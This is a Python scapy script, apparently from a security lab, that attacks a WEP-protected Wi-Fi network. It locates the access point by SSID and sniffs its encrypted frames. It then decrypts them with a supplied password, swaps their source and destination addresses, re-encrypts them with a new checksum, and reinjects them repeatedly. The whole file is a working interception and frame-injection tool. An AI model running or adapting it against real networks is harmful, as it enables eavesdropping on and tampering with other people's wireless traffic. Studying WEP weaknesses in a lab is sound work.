import argparse
import sys
from rc4 import rc4, generate_seed
from scapy.all import Dot11FCS, LLC, Dot11Beacon, Dot11WEP, sniff, UDP, IP, send, sendp, Raw
from scapy.utils import hexstr, hexdiff
import binascii
from zlib import crc32

parser = argparse.ArgumentParser()
parser.add_argument("-iface", help="Wireless interface", type=str, required=True)
parser.add_argument("-ssid", help="Wi-Fi SSID", type=str, required=True)
parser.add_argument("-sc", help="Number of frames to sniff", type=int, required=True)
parser.add_argument("-pwd", help="WEP password", type=str)
args = parser.parse_args()
data = []

def sniffareedoo(cond, _type):
    global data
    def sniff_inner(pkt):
        if _type in pkt and cond(pkt):
            data.append(pkt)
    return sniff_inner

def name_cond(val):
    try:
        return val.info == bytes(args.ssid, encoding='utf-8')
    except Exception as e:
        return False

def addr_cond(val):
    return any(args.mac == e for e in (val.addr1, val.addr2, val.addr3, val.addr4))

def decypher(pkt):
    # Build seed and decypher
    key_stream = generate_seed(pkt[Dot11WEP].iv, args.pwd)
    decyphered = rc4(pkt[Dot11WEP].wepdata, key_stream)
    stack = LLC(decyphered)

    if not (IP in stack and UDP in stack and Raw in stack):
        return None

    del pkt[Dot11FCS].fcs
    del stack[IP].chksum
    del stack[UDP].chksum

    stack[IP].src, stack[IP].dst = stack[IP].dst, stack[IP].src
    pkt[Dot11FCS].addr1, pkt[Dot11FCS].addr3 = pkt[Dot11FCS].addr3, pkt[Dot11FCS].addr1

    pkt[Dot11WEP].wepdata = rc4(bytes(stack), key_stream)
    pkt[Dot11WEP].icv = crc32(bytes(stack))

    return pkt

sniff(count=args.sc, iface=args.iface, prn=sniffareedoo(name_cond, Dot11Beacon))
args.mac = data[0].addr2
data = []
sniff(count=args.sc, iface=args.iface, prn=sniffareedoo(addr_cond, Dot11WEP))

for pkt in data:
    if Raw in pkt:
        pkt[IP].src, pkt[IP].dst = pkt[IP].dst, pkt[IP].src
        pkt[Dot11FCS].addr1, pkt[Dot11FCS].addr3 = pkt[Dot11FCS].addr3, pkt[Dot11FCS].addr1

        del pkt[IP].chksum
        del pkt[UDP].chksum
        del pkt[Dot11FCS].fcs

        sendp(pkt, iface=args.iface, count=args.sc)
    else:
        decPacket = decypher(pkt)
        if decPacket:
            sendp(decPacket, iface=args.iface, count=args.sc)
